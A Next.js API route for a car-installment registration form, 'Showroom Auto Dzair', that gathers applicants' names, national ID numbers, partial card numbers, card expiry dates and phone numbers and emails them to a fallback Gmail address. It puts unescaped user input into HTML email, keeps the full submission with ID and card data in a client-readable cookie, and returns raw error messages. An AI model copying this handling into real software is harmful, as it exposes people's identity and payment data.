import { NextResponse } from "next/server"
import { Resend } from "resend"
import { cars } from "@/lib/data"

export async function POST(request: Request) {
  try {
    const body = await request.json()
    const { 
      fullName, 
      nin, 
      cardLast8, 
      cardExpiry, 
      phone1, 
      phone2, 
      hasPreviousInstallment, 
      selectedCarId, 
      selectedCar: carFromBody, 
      createdAt 
    } = body

    // 1. Resolve selected car
    const selectedCar = carFromBody || cars.find((car) => car.id === selectedCarId)

    // 2. Validate environment variables
    const resendApiKey = process.env.RESEND_API_KEY?.trim()
    const toEmail = process.env.EMAIL_TO?.trim() || "autodzaircontact@gmail.com"
    const fromEmail = process.env.EMAIL_FROM?.trim() || "onboarding@resend.dev"

    if (!resendApiKey) {
      console.error("RESEND_API_KEY is not defined in the environment.")
      return NextResponse.json(
        { success: false, message: "إعدادات البريد الإلكتروني غير مكتملة" },
        { status: 500 }
      )
    }

    // 3. Generate unique submission ID (Showroom style)
    const submissionId = `SR-${Date.now().toString().slice(-6)}-${Math.floor(100 + Math.random() * 900)}`
    
    const submission = {
      id: submissionId,
      fullName,
      nin,
      cardLast8,
      cardExpiry,
      phone1,
      phone2: phone2 || "غير محدد",
      hasPreviousInstallment,
      selectedCar,
      createdAt: createdAt || new Date().toISOString(),
      status: "pending"
    }

    // 4. Send email using Resend
    const resend = new Resend(resendApiKey)
    const dateFormatted = new Date(submission.createdAt).toLocaleString("ar-DZ", { timeZone: "Africa/Algiers" })

    const htmlContent = `
      <!DOCTYPE html>
      <html lang="ar" dir="rtl">
      <head>
        <meta charset="UTF-8">
        <style>
          body {
            font-family: 'Cairo', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f4f7f6;
            color: #333333;
            margin: 0;
            padding: 0;
            direction: rtl;
            text-align: right;
          }
          .email-container {
            max-width: 600px;
            margin: 20px auto;
            background: #ffffff;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
            border: 1px solid #e0e0e0;
          }
          .header {
            background-color: #0f172a;
            color: #ffffff;
            padding: 30px;
            text-align: center;
          }
          .header h1 {
            margin: 0;
            font-size: 24px;
            font-weight: 700;
          }
          .header p {
            margin: 5px 0 0 0;
            color: #94a3b8;
            font-size: 14px;
          }
          .content {
            padding: 30px;
          }
          .section-title {
            font-size: 18px;
            color: #0f172a;
            border-bottom: 2px solid #3b82f6;
            padding-bottom: 8px;
            margin-top: 25px;
            margin-bottom: 15px;
            font-weight: 600;
          }
          .info-table {
            width: 100%;
            border-collapse: collapse;
            margin-bottom: 20px;
          }
          .info-table td {
            padding: 10px;
            border-bottom: 1px solid #f1f5f9;
            font-size: 15px;
          }
          .info-table td.label {
            font-weight: bold;
            color: #64748b;
            width: 35%;
          }
          .info-table td.value {
            color: #0f172a;
          }
          .car-card {
            background-color: #f8fafc;
            border: 1px solid #e2e8f0;
            border-radius: 8px;
            padding: 20px;
            margin-top: 15px;
          }
          .car-title {
            font-size: 18px;
            font-weight: bold;
            color: #3b82f6;
            margin-top: 0;
            margin-bottom: 10px;
          }
          .price-badge {
            display: inline-block;
            background-color: #dbeafe;
            color: #1e40af;
            padding: 5px 12px;
            border-radius: 9999px;
            font-size: 14px;
            font-weight: bold;
            margin-top: 5px;
          }
          .badge-pending {
            display: inline-block;
            background-color: #fef3c7;
            color: #92400e;
            padding: 4px 10px;
            border-radius: 4px;
            font-size: 13px;
            font-weight: 600;
          }
          .footer {
            background-color: #f8fafc;
            text-align: center;
            padding: 20px;
            font-size: 12px;
            color: #64748b;
            border-top: 1px solid #e2e8f0;
          }
        </style>
      </head>
      <body>
        <div class="email-container">
          <div class="header">
            <h1>Showroom Auto Dzair</h1>
            <p>طلب تسجيل جديد لسيارة بالتقسيط</p>
          </div>
          <div class="content">
            <div style="text-align: left; margin-bottom: 20px;">
              <span class="badge-pending">قيد المراجعة</span>
            </div>
            
            <div class="section-title">👤 المعلومات الشخصية</div>
            <table class="info-table">
              <tr>
                <td class="label">الاسم الكامل:</td>
                <td class="value">${submission.fullName}</td>
              </tr>
              <tr>
                <td class="label">رقم التعريف الوطني (NIN):</td>
                <td class="value">${submission.nin}</td>
              </tr>
              <tr>
                <td class="label">الهاتف الأول:</td>
                <td class="value" dir="ltr">${submission.phone1}</td>
              </tr>
              <tr>
                <td class="label">الهاتف الثاني:</td>
                <td class="value" dir="ltr">${submission.phone2}</td>
              </tr>
              <tr>
                <td class="label">تقسيط سابق:</td>
                <td class="value">${submission.hasPreviousInstallment ? "نعم" : "لا"}</td>
              </tr>
            </table>

            <div class="section-title">💳 تفاصيل البطاقة الذهبية</div>
            <table class="info-table">
              <tr>
                <td class="label">آخر 8 أرقام:</td>
                <td class="value" dir="ltr">**** **** **** ${submission.cardLast8.slice(-4)}</td>
              </tr>
              <tr>
                <td class="label">تاريخ الصلاحية:</td>
                <td class="value" dir="ltr">${submission.cardExpiry}</td>
              </tr>
            </table>

            <div class="section-title">🚗 السيارة المطلوبة</div>
            <div class="car-card">
              ${
                selectedCar 
                  ? `
                    <div class="car-title">${selectedCar.brand} ${selectedCar.model} (${selectedCar.year})</div>
                    <div style="font-size: 14px; color: #475569; margin-bottom: 10px;">
                      سعر السيارة الكلي: <strong>${new Intl.NumberFormat("ar-DZ").format(selectedCar.price)} دج</strong>
                    </div>
                    <div style="font-size: 14px; color: #475569;">
                      القسط الشهري: <strong>${new Intl.NumberFormat("ar-DZ").format(selectedCar.monthlyPayment)} دج / شهر</strong>
                    </div>
                    `
                  : `<div class="car-title">لم يتم اختيار سيارة</div>`
              }
            </div>

            <div style="margin-top: 30px; font-size: 13px; color: #94a3b8; text-align: center;">
              تاريخ تقديم الطلب: ${dateFormatted} | الرقم المرجعي: ${submission.id}
            </div>
          </div>
          <div class="footer">
            هذا البريد تم إرساله تلقائياً من نظام التسجيل لـ Showroom Auto Dzair
          </div>
        </div>
      </body>
      </html>
    `

    await resend.emails.send({
      from: fromEmail,
      to: toEmail,
      subject: `طلب تقسيط جديد (${submission.id}) - ${submission.fullName}`,
      html: htmlContent,
    })

    // 5. Construct response and set cookie
    const response = NextResponse.json({
      success: true,
      id: submissionId,
      message: "تم تسجيل بيانات العميل بنجاح وسيتم إرسال الإشعار"
    }, { status: 201 })

    response.cookies.set("last_submission", JSON.stringify(submission), {
      maxAge: 3600, // 1 hour
      path: "/",
      sameSite: "lax",
    })

    return response
  } catch (error: any) {
    console.error("[Resend Registration API Error]:", error)
    return NextResponse.json(
      { success: false, message: error.message || "حدث خطأ في التسجيل" },
      { status: 500 }
    )
  }
}
